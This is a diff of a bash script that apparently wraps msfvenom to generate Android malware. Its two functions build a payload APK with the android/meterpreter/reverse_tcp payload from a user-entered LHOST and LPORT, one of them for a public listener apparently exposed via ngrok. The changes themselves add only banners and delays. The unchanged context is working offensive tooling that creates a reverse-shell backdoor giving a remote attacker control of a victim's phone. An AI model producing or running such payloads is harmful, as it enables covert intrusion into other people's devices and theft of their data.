@@ -122,12 +122,20 @@ create_internal_payload() {
     sleep 0.3s
     read -p "Please Enter Name Of APK PAyload : " payload_name
     echo ''
+    sleep 0.3s
+    clear
+    sleep 0.3s
+    echo -e $LGreen '';figlet -c -f slant "Generating ..."
+    echo '' 
+    sleep 0.3s
+    echo ''
+    sleep 0.3s
     msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost1 LPORT=$lport1 -o $payload_name.apk
     sleep 1s
     echo ''
     sleep 1s
     echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk (^_^) ${NC}"
-    sleep 2s
+    sleep 3s
 }
 
 # generate puplic payload
@@ -148,12 +156,18 @@ create_external_payload() {
     sleep 0.3s
     read -p "Please Enter Name Of APK PAyload : " payload_name
     echo ''
+    sleep 0.3s
+    clear
+    sleep 0.3s
+    echo -e $LGreen '';figlet -c -f slant "Generating ..."
+    echo '' 
+    sleep 0.3s
     msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $payload_name.apk
     sleep 2s
     echo '' 
     sleep 1s
     echo -e "${GREEN}[+] APK Payload Generated Successfully With Name $payload_name.apk (^_^) ${NC}"
-    sleep 2s
+    sleep 3s
 }
 
 # installing ngrok tool
